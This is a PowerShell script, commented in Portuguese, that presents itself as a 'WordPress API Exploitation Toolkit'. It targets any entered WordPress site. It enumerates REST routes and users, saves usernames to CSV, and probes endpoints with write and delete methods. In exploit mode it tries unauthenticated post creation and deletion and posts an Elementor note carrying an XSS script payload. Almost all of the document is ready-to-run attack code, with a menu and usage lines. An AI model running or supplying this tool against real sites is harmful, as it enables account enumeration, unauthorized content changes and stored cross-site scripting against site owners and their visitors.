# WordPress API Exploitation Toolkit
# Ferramenta especializada em pentest de APIs WordPress/Elementor

function Invoke-WordPressAPIScan {
    param(
        [string]$BaseUrl,
        [switch]$Aggressive = $false,
        [switch]$Exploit = $false
    )
    
    try {
        Write-Host "`n" + "="*60 -ForegroundColor Cyan
        Write-Host "WORDPRESS API EXPLOITATION TOOLKIT" -ForegroundColor Magenta
        Write-Host "="*60 -ForegroundColor Cyan
        Write-Host "Target: $BaseUrl" -ForegroundColor White
        Write-Host "Mode: $(if ($Exploit) {'EXPLOIT'} else {'SCAN'})" -ForegroundColor $(if ($Exploit) {'Red'} else {'Yellow'})
        
        # Normaliza a URL base
        if (-not $BaseUrl.StartsWith('http')) {
            $BaseUrl = "https://$BaseUrl"
        }
        
        $baseUri = [System.Uri]$BaseUrl
        $BaseUrl = $baseUri.GetLeftPart([System.UriPartial]::Authority)
        
        # Constrói a URL da API REST
        $apiUrl = "$BaseUrl/wp-json"
        
        Write-Host "`n[PHASE 1] WordPress REST API Discovery" -ForegroundColor Green
        
        # 1. Descobrimento de Endpoints Principais
        try {
            $response = Invoke-WebRequest -Uri $apiUrl -TimeoutSec 10 -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            $endpoints = $response.Content | ConvertFrom-Json
            
            $routeCount = ($endpoints.routes.PSObject.Properties | Measure-Object).Count
            Write-Host "  [+] Found $routeCount API routes" -ForegroundColor Green
            
            # Mostra namespaces descobertos
            $namespaces = $endpoints.namespaces | Sort-Object
            Write-Host "  [+] Namespaces: $($namespaces -join ', ')" -ForegroundColor Cyan
            
        } catch {
            Write-Host "  [-] Could not access WP-JSON: $($_.Exception.Message)" -ForegroundColor Red
            return @()
        }
        
        # 2. Endpoints Críticos para Testar
        $criticalEndpoints = @(
            "/wp/v2/users",
            "/wp/v2/users/me", 
            "/wp/v2/posts",
            "/wp/v2/pages",
            "/wp/v2/comments",
            "/wp/v2/settings",
            "/wp/v2/taxonomies",
            "/wp/v2/categories",
            "/wp/v2/tags",
            "/wp/v2/media",
            "/wp/v2/types",
            "/wp/v2/statuses"
        )
        
        # 3. Endpoints de Plugins (Elementor, Woocommerce, etc)
        $pluginEndpoints = @(
            "/elementor/v1/notes",
            "/elementor/v1/notes/1",
            "/elementor/v1/notes/summary",
            "/elementor/v1/notes/users",
            "/elementor/v1/send-event",
            "/elementskit/v1/widget/mailchimp",
            "/elementskit/v1/dynamic-content",
            "/elementskit/v1/layout-manager-api",
            "/elementskit/v1/my-template",
            "/elementskit/v1/megamenu",
            "/elementskit/v1/widget-builder",
            "/wc/v3/orders",
            "/wc/v3/products",
            "/wc/v3/customers",
            "/jetpack/v4/connection",
            "/yoast/v1/configuration"
        )
        
        $allEndpoints = $criticalEndpoints + $pluginEndpoints
        $results = @()
        
        Write-Host "`n[PHASE 2] Endpoint Accessibility Testing" -ForegroundColor Green
        
        foreach ($endpoint in $allEndpoints) {
            $testUrl = "$apiUrl$endpoint"
            
            try {
                Write-Host "  Testing: $endpoint" -ForegroundColor Gray -NoNewline
                
                $response = Invoke-WebRequest -Uri $testUrl -TimeoutSec 5 -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                $statusCode = [int]$response.StatusCode
                $content = $response.Content
                
                if ($statusCode -eq 200) {
                    Write-Host " - [PUBLIC] $statusCode" -ForegroundColor Green
                    
                    # Analisa o conteúdo da resposta
                    $data = $null
                    $itemCount = 0
                    try {
                        $data = $content | ConvertFrom-Json
                        if ($data -is [Array]) {
                            $itemCount = $data.Count
                        } elseif ($data -is [PSCustomObject]) {
                            $itemCount = 1
                        }
                    } catch { }
                    
                    $result = [PSCustomObject]@{
                        Endpoint = $endpoint
                        Status = "Public"
                        StatusCode = $statusCode
                        Methods = $response.Headers['Allow']
                        ContentLength = $response.RawContentLength
                        ItemCount = $itemCount
                        RiskLevel = "HIGH"
                    }
                    $results += $result
                    
                    # Análise específica por endpoint
                    switch -Wildcard ($endpoint) {
                        "*/users*" {
                            Write-Host "    [!] USER ENUMERATION POSSIBLE!" -ForegroundColor Red
                            if ($data -and $data.Count -gt 0) {
                                Write-Host "    Found $($data.Count) users:" -ForegroundColor Yellow
                                $data | ForEach-Object { 
                                    Write-Host "      - $($_.name) (ID: $($_.id), Slug: $($_.slug))" -ForegroundColor Gray 
                                }
                            }
                        }
                        "*/posts*" {
                            Write-Host "    [!] POST ACCESS POSSIBLE!" -ForegroundColor Red
                            if ($Exploit) {
                                Invoke-PostExploitation -BaseUrl $BaseUrl -ApiUrl $apiUrl
                            }
                        }
                        "*/elementor*" {
                            Write-Host "    [!] ELEMENTOR API EXPOSED!" -ForegroundColor Red
                            if ($Exploit) {
                                Invoke-ElementorExploitation -BaseUrl $BaseUrl -ApiUrl $apiUrl
                            }
                        }
                    }
                    
                } else {
                    Write-Host " - [RESTRICTED] $statusCode" -ForegroundColor Yellow
                }
                
            } catch [System.Net.WebException] {
                $statusCode = $_.Exception.Response.StatusCode.value__
                Write-Host " - [BLOCKED] $statusCode" -ForegroundColor Red
            } catch {
                Write-Host " - [ERROR] $($_.Exception.Message)" -ForegroundColor DarkRed
            }
        }
        
        # 4. Teste de Métodos HTTP
        Write-Host "`n[PHASE 3] HTTP Methods Testing" -ForegroundColor Green
        
        $testEndpoints = @("$apiUrl/wp/v2/posts", "$apiUrl/wp/v2/users", "$apiUrl/elementor/v1/notes")
        $testMethods = @("GET", "POST", "PUT", "DELETE", "PATCH")
        
        foreach ($testEndpoint in $testEndpoints) {
            foreach ($method in $testMethods) {
                try {
                    Write-Host "  $method $($testEndpoint.Replace($apiUrl, ''))" -ForegroundColor Gray -NoNewline
                    
                    $response = Invoke-WebRequest -Uri $testEndpoint -Method $method -TimeoutSec 5 -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                    Write-Host " - [ALLOWED] $([int]$response.StatusCode)" -ForegroundColor Green
                    
                } catch [System.Net.WebException] {
                    $statusCode = $_.Exception.Response.StatusCode.value__
                    Write-Host " - [DENIED] $statusCode" -ForegroundColor Red
                } catch {
                    Write-Host " - [ERROR]" -ForegroundColor DarkRed
                }
            }
        }
        
        # 5. Busca por Endpoints Ocultos/Numéricos
        Write-Host "`n[PHASE 4] Hidden Endpoints Discovery" -ForegroundColor Green
        
        $hiddenPatterns = @(
            "/wp/v2/users/1", "/wp/v2/users/2", "/wp/v2/users/3",
            "/wp/v2/posts/1", "/wp/v2/posts/2", 
            "/wp/v2/pages/1", "/wp/v2/pages/2",
            "/wp/v2/comments/1", "/wp/v2/comments/2",
            "/wp/v2/media/1", "/wp/v2/media/2"
        )
        
        $foundHidden = @()
        foreach ($hidden in $hiddenPatterns) {
            $testUrl = "$apiUrl$hidden"
            try {
                $response = Invoke-WebRequest -Uri $testUrl -TimeoutSec 3 -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                if ([int]$response.StatusCode -eq 200) {
                    Write-Host "  FOUND: $hidden" -ForegroundColor Green
                    $foundHidden += $hidden
                }
            } catch {
                # Silencioso para endpoints não encontrados
            }
        }
        
        # 6. Relatório Final
        Write-Host "`n" + "="*60 -ForegroundColor Cyan
        Write-Host "SCAN SUMMARY" -ForegroundColor Magenta
        Write-Host "="*60 -ForegroundColor Cyan
        
        $publicEndpoints = $results | Where-Object { $_.Status -eq 'Public' }
        $highRiskEndpoints = $publicEndpoints | Where-Object { $_.RiskLevel -eq 'HIGH' }
        
        Write-Host "  Public Endpoints: $($publicEndpoints.Count)" -ForegroundColor White
        Write-Host "  High Risk Endpoints: $($highRiskEndpoints.Count)" -ForegroundColor Red
        Write-Host "  Hidden Endpoints Found: $($foundHidden.Count)" -ForegroundColor Yellow
        Write-Host "  Total Tests: $(($allEndpoints + $hiddenPatterns).Count)" -ForegroundColor Gray
        
        if ($publicEndpoints.Count -gt 0) {
            Write-Host "`n[CRITICAL FINDINGS]:" -ForegroundColor Red
            $publicEndpoints | Format-Table Endpoint, StatusCode, ItemCount, RiskLevel -AutoSize
            
            # Salva resultados em arquivo
            $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
            $outputFile = "wordpress_scan_$($baseUri.Host)_$timestamp.csv"
            $publicEndpoints | Export-Csv -Path $outputFile -NoTypeInformation
            Write-Host "  Results saved to: $outputFile" -ForegroundColor Cyan
        }
        
        if ($highRiskEndpoints.Count -gt 0 -and $Exploit) {
            Write-Host "`n[EXPLOITATION MODE] Launching exploits..." -ForegroundColor Red
            Start-Sleep -Seconds 2
            Invoke-AdvancedExploitation -BaseUrl $BaseUrl -ApiUrl $apiUrl -Endpoints $highRiskEndpoints
        }
        
        return $publicEndpoints
        
    } catch {
        Write-Host "[FATAL ERROR] $($_.Exception.Message)" -ForegroundColor Red
        return @()
    }
}

function Invoke-ElementorExploitation {
    param([string]$BaseUrl, [string]$ApiUrl)
    
    Write-Host "`n[ELEMENTOR EXPLOITATION]" -ForegroundColor Red
    
    # 1. Tenta criar uma nota via Elementor API
    $notesUrl = "$ApiUrl/elementor/v1/notes"
    $testPayload = @{
        content = "Test note created by security scan - <script>alert('XSS')</script>"
        position = @{ x = 100; y = 100 }
        route_url = $BaseUrl
        route_title = "Security Test"
    } | ConvertTo-Json
    
    try {
        Write-Host "  Testing note creation..." -ForegroundColor Yellow
        $response = Invoke-WebRequest -Uri $notesUrl -Method POST -Body $testPayload -ContentType "application/json" -TimeoutSec 5
        if ([int]$response.StatusCode -eq 201) {
            Write-Host "  [!] NOTE CREATION SUCCESSFUL - Unauthorized access!" -ForegroundColor Red
            
            # Tenta extrair a nota criada
            $noteData = $response.Content | ConvertFrom-Json
            Write-Host "    Note ID: $($noteData.id)" -ForegroundColor Yellow
        }
    } catch {
        Write-Host "  Note creation blocked: $($_.Exception.Message)" -ForegroundColor Green
    }
    
    # 2. Tenta acessar dados de usuários do Elementor
    $usersUrl = "$ApiUrl/elementor/v1/notes/users"
    try {
        $response = Invoke-WebRequest -Uri $usersUrl -TimeoutSec 5
        $users = $response.Content | ConvertFrom-Json
        Write-Host "  Found $($users.Count) Elementor users" -ForegroundColor Yellow
    } catch {
        Write-Host "  Cannot access Elementor users" -ForegroundColor Gray
    }
}

function Invoke-PostExploitation {
    param([string]$BaseUrl, [string]$ApiUrl)
    
    Write-Host "`n[POST EXPLOITATION]" -ForegroundColor Red
    
    # 1. Tenta criar um post
    $postsUrl = "$ApiUrl/wp/v2/posts"
    $testPost = @{
        title = "Security Test Post"
        content = "This is a test post created by security scanner"
        status = "draft"
    } | ConvertTo-Json
    
    try {
        Write-Host "  Testing post creation..." -ForegroundColor Yellow
        $response = Invoke-WebRequest -Uri $postsUrl -Method POST -Body $testPost -ContentType "application/json" -TimeoutSec 5
        if ([int]$response.StatusCode -eq 201) {
            Write-Host "  [!] POST CREATION SUCCESSFUL - Unauthorized access!" -ForegroundColor Red
            
            $postData = $response.Content | ConvertFrom-Json
            Write-Host "    Post ID: $($postData.id)" -ForegroundColor Yellow
            Write-Host "    Post URL: $($postData.link)" -ForegroundColor Yellow
            
            # Tenta deletar o post
            $deleteUrl = "$ApiUrl/wp/v2/posts/$($postData.id)"
            try {
                Invoke-WebRequest -Uri $deleteUrl -Method DELETE -TimeoutSec 3
                Write-Host "    Test post cleaned up" -ForegroundColor Green
            } catch {
                Write-Host "    Could not delete test post" -ForegroundColor Yellow
            }
        }
    } catch {
        Write-Host "  Post creation blocked: $($_.Exception.Message)" -ForegroundColor Green
    }
}

function Invoke-AdvancedExploitation {
    param([string]$BaseUrl, [string]$ApiUrl, [array]$Endpoints)
    
    Write-Host "`n[ADVANCED EXPLOITATION]" -ForegroundColor Red
    
    foreach ($endpoint in $Endpoints) {
        $endpointUrl = $endpoint.Endpoint
        
        switch -Wildcard ($endpointUrl) {
            "*/users*" {
                Write-Host "  Exploiting user enumeration: $endpointUrl" -ForegroundColor Yellow
                Invoke-UserEnumeration -ApiUrl $ApiUrl
            }
            "*/posts*" {
                Write-Host "  Exploiting post access: $endpointUrl" -ForegroundColor Yellow
                Invoke-PostEnumeration -ApiUrl $ApiUrl
            }
            "*/elementor*" {
                Write-Host "  Exploiting Elementor: $endpointUrl" -ForegroundColor Yellow
                Invoke-ElementorDataExtraction -ApiUrl $ApiUrl
            }
        }
    }
}

function Invoke-UserEnumeration {
    param([string]$ApiUrl)
    
    $usersUrl = "$ApiUrl/wp/v2/users"
    
    try {
        $response = Invoke-WebRequest -Uri $usersUrl -TimeoutSec 5
        $users = $response.Content | ConvertFrom-Json
        
        Write-Host "    Found $($users.Count) users:" -ForegroundColor Cyan
        
        $userData = @()
        foreach ($user in $users) {
            $userInfo = [PSCustomObject]@{
                ID = $user.id
                Username = $user.slug
                Name = $user.name
                Description = $user.description
                Link = $user.link
            }
            $userData += $userInfo
            Write-Host "      - $($user.name) (@$($user.slug))" -ForegroundColor Gray
        }
        
        # Salva dados de usuários
        $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
        $userFile = "wordpress_users_$timestamp.csv"
        $userData | Export-Csv -Path $userFile -NoTypeInformation
        Write-Host "    User data saved to: $userFile" -ForegroundColor Green
        
    } catch {
        Write-Host "    User enumeration failed" -ForegroundColor Red
    }
}

function Invoke-PostEnumeration {
    param([string]$ApiUrl)
    
    $postsUrl = "$ApiUrl/wp/v2/posts"
    
    try {
        $response = Invoke-WebRequest -Uri "$postsUrl?per_page=10" -TimeoutSec 5
        $posts = $response.Content | ConvertFrom-Json
        
        Write-Host "    Found $($posts.Count) recent posts:" -ForegroundColor Cyan
        
        foreach ($post in $posts | Select-Object -First 5) {
            Write-Host "      - $($post.title.rendered) (ID: $($post.id))" -ForegroundColor Gray
            Write-Host "        URL: $($post.link)" -ForegroundColor DarkGray
        }
        
    } catch {
        Write-Host "    Post enumeration failed" -ForegroundColor Red
    }
}

function Invoke-ElementorDataExtraction {
    param([string]$ApiUrl)
    
    $notesUrl = "$ApiUrl/elementor/v1/notes"
    
    try {
        $response = Invoke-WebRequest -Uri $notesUrl -TimeoutSec 5
        $notes = $response.Content | ConvertFrom-Json
        
        Write-Host "    Found $($notes.Count) Elementor notes" -ForegroundColor Cyan
        
        if ($notes.Count -gt 0) {
            $notes | ForEach-Object {
                Write-Host "      - Note by $($_.author) : $($_.content)" -ForegroundColor Gray
            }
        }
        
    } catch {
        Write-Host "    Elementor data extraction failed" -ForegroundColor Red
    }
}

function Show-WordPressScanMenu {
    Write-Host "`n" + "="*60 -ForegroundColor Cyan
    Write-Host "WORDPRESS API EXPLOITATION TOOLKIT" -ForegroundColor Magenta
    Write-Host "="*60 -ForegroundColor Cyan
    Write-Host "1. Basic WordPress API Scan" -ForegroundColor Yellow
    Write-Host "2. Aggressive Scan + Exploitation" -ForegroundColor Red  
    Write-Host "3. Custom Target Scan" -ForegroundColor Green
    Write-Host "4. Exit" -ForegroundColor Gray
    Write-Host "="*60 -ForegroundColor Cyan
}

# Função principal de execução
function Start-WordPressPentest {
    do {
        Show-WordPressScanMenu
        $choice = Read-Host "`nSelect option"
        
        switch ($choice) {
            "1" {
                $target = Read-Host "Enter WordPress site URL"
                Invoke-WordPressAPIScan -BaseUrl $target
            }
            "2" {
                $target = Read-Host "Enter WordPress site URL"
                Invoke-WordPressAPIScan -BaseUrl $target -Exploit
            }
            "3" {
                $target = Read-Host "Enter WordPress site URL"
                $aggressive = Read-Host "Aggressive mode? (Y/N)"
                $exploit = Read-Host "Exploitation mode? (Y/N)"
                
                Invoke-WordPressAPIScan -BaseUrl $target -Aggressive:($aggressive -eq 'Y') -Exploit:($exploit -eq 'Y')
            }
            "4" {
                Write-Host "Exiting..." -ForegroundColor Green
                return
            }
            default {
                Write-Host "Invalid option" -ForegroundColor Red
            }
        }
        
        if ($choice -ne "4") {
            $continue = Read-Host "`nPerform another scan? (Y/N)"
            if ($continue -ne 'Y') { break }
        }
        
    } while ($true)
}

Exemplo de uso rápido:
Start-WordPressPentest
Invoke-WordPressAPIScan -BaseUrl "https://exemplo.com" -Exploit

Write-Host "WordPress API Exploitation Toolkit loaded!" -ForegroundColor Green
Write-Host "Use Start-WordPressPentest to begin scanning" -ForegroundColor Yellow
